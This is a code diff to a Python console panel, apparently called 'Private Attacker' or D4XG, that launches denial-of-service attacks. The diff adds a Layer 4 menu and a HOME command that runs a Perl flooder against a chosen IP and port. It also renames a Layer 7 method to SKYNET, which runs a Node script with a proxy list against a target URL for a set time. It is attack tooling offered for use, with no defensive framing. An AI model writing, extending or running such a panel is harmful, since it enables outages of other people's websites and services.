@@ -36,6 +36,7 @@ class Color:
     colorama.init()
 
 def menu():
+  os.system('cls' if os.name == 'nt' else 'clear')
   print('''
 \033[31m┌──────────────────────────────────────────────────────────┐  
 
@@ -91,6 +92,38 @@ def layer7():
                            ●  404    [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  BURN    [\033[32mLayer7\x1b[38;2;151;16;245m]
                            ●  FLOOD  [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  KILLER  [\033[32mLayer7\x1b[38;2;151;16;245m]
                            ●  HULK   [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  UAM     [\033[32mLayer7\x1b[38;2;151;16;245m]
+                           ●  SKYNET [\033[32mLayer7\x1b[38;2;151;16;245m]
+\033[0m""")
+
+
+
+def layer4():
+	os.system('cls' if os.name == 'nt' else 'clear')
+	print("""              \x1b[38;2;169;13;245m╔═══════════════════════════════════════════════════════════════════╗
+              ║          \x1b[38;2;160;15;245m        ,:::::'       ;           OOO                    ║
+              ║          \x1b[38;2;160;15;245m        ::::::;       ;          OOOOO                   ║
+              ║          \x1b[38;2;151;16;245m        ;:::::;       ;         OOOOOOOO                 ║
+              ║          \x1b[38;2;143;18;246m       ,;::::::;     ;'         / OOOOOOO                ║
+              ║          \x1b[38;2;134;20;246m██╗      █████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗        ║
+              ║          \x1b[38;2;98;27;247m██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║        ║
+              ║          \x1b[38;2;89;28;247m██║     ███████║ ╚████╔╝ █████╗  ██████╔╝███████║        ║
+              ║          \x1b[38;2;72;32;248m██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║        ║
+              ║          \x1b[38;2;63;33;248m███████╗██║  ██║   ██║   ███████╗██║  ██║     ██║        ║
+              ║          \x1b[38;2;214;4;244m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝        ║
+              ║          \x1b[38;2;214;4;244m `:`:::::::`;:::::: ;::::::#/               DOO          ║
+              ║          \x1b[38;2;214;4;244m  :::`:::::::`;; ;:::::::::##                OO          ║
+              ║          \x1b[38;2;214;4;244m  ::::`:::::::`;::::::::;:::#                OO          ║
+              ║          \x1b[38;2;214;4;244m  `:::::`::::::::::::;'`:;::#                O           ║
+              \x1b[38;2;214;4;244m╚═══════════════════════════════════════════════════════════════════╝
+
+                                  \033[32mWELCOME TO \033[33m Private Attacker
+                          TYPE [\033[32mMETHODS\x1b[38;2;151;16;245m] [\033[32mURL\x1b[38;2;151;16;245m] [\033[32mTIME\x1b[38;2;151;16;245m] TO START ATTACK
+                      ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+                           ●  HOME   [\033[32mLayer4\x1b[38;2;151;16;245m]    ●  CURSE   [\033[32mLayer4\x1b[38;2;151;16;245m]
+                           ●  TLX    [\033[32mLayer4\x1b[38;2;151;16;245m]    ●  TLS     [\033[32mLayer4\x1b[38;2;151;16;245m]
+                           ●  404    [\033[32mLayer4\x1b[38;2;151;16;245m]    ●  BURN    [\033[32mLayer4\x1b[38;2;151;16;245m]
+                           ●  FLOOD  [\033[32mLayer4\x1b[38;2;151;16;245m]    ●  KILLER  [\033[32mLayer4\x1b[38;2;151;16;245m]
+                           ●  HULK   [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  UAM     [\033[32mLayer4\x1b[38;2;151;16;245m]
                            ●  DAXG   [\033[32mLayer7\x1b[38;2;151;16;245m]
 \033[0m""")
 
@@ -142,8 +175,8 @@ def main():
 \033[0m""")
 
 	while True:
-		sys.stdout.write(f"\x1b]2;[ \ ] Private-Panel | Online Users: [∞] | Attack Sended: [∞] | Expired: [2025]\x07")
-		sin = input(" "+Back.WHITE+Fore.MAGENTA+" root ● D4XG-PA "+Fore.RESET+Back.RESET+" ► ")
+		sys.stdout.write(f"\x1b]2;[\] Private-Panel | Online Users: [∞] | Attack Sended: [∞] | Expired: [2025]\x07")
+		sin = input(Fore.LIGHTRED_EX+"╔═══"+Fore.LIGHTRED_EX+"[""root"+Fore.LIGHTRED_EX+"@"+Fore.LIGHTRED_EX+"D4XG"+Fore.RED+"]"+Fore.LIGHTRED_EX+"\n╚══\x1b[38;5;160m► "+Fore.WHITE)
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
 			os.system ("clear")
@@ -155,16 +188,17 @@ def main():
 			menu()
 		if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
 			layer7()
+		if sinput == "layer4" or sinput == "LAYER4" or sinput == "l4" or sinput == "L4":
+			layer4()
 		if sinput == "rule" or sinput == "RULES" or sinput == "rules" or sinput == "RULE":
 			rules()
 		if sinput == "exit" or sinput == "EXIT" or sinput == "kill" or sinput == "KILL":
-			sys.exit()
-      
+			sys.exit()      
 		elif sinput == "scrape" or sinput == "SCRAPE":
-				os.system(f'cd L7 && python3 scrape.py')
-				main()
-
-#########LAYER-7########  
+			os.system(f'cd L7 && python3 scrape.py')
+			main()
+#########LAYER-7########
+		
 		elif sinput == "FLOOD" or sinput == "flood":
 			try:
 				url = sin.split()[1]
@@ -176,6 +210,19 @@ def main():
 			except IndexError:
 				print("Usage: FLOOD <url> <time>")
 				print('Example: FLOOD https://example.com 120')
+
+		elif sinput == "HOME" or sinput == "home":
+			try:
+				url = sin.split()[1]
+				port = sin.split()[2]
+				time = sin.split()[3]
+				os.system(f'cd L4 && perl home.pl {url} {port} 65500 {time}')
+			except ValueError:
+				print("Usage: HOME <ip> <port> <time>")
+				print('Example: HOME 1.1.1.1 433')
+			except IndexError:
+				print("Usage: HOME <ip> <port> <time>")
+				print('Example: HOME 1.1.1.1 433')
 
 		elif sinput == "CURSE" or sinput == "curse":
 			try:
@@ -237,17 +284,17 @@ def main():
 				print("Usage: UAM <url> <time>")
 				print('Example: UAM https://example.com 120')
 
-		elif sinput == "DAXG" or sinput == "daxg":
+		elif sinput == "SKYNET" or sinput == "daxg":
 			try:
 				url = sin.split()[1]
 				time = sin.split()[2]
-				os.system(f'cd L7 && node DAXG.js {url} {time} 150 150 proxy.txt')
+				os.system(f'cd L7 && node SKYNET.js {url} {time} 150 150 proxies.txt')
 			except ValueError:
-				print("Usage: DAXG <url> <time>")
-				print('Example: DAXG https://example.com 120')
+				print("Usage: SKYNET <url> <time>")
+				print('Example: SKYNET https://example.com 120')
 			except IndexError:
-				print("Usage: DAXG <url> <time>")
-				print('Example: DAXG https://example.com 120')
+				print("Usage: SKYNET <url> <time>")
+				print('Example: SKYNET https://example.com 120')
 
 		elif sinput == "TLX" or sinput == "tlx":
 			try:
@@ -280,7 +327,5 @@ def main():
 				main()
 			except IndexError:
 				main()
-
-					
 
 main()
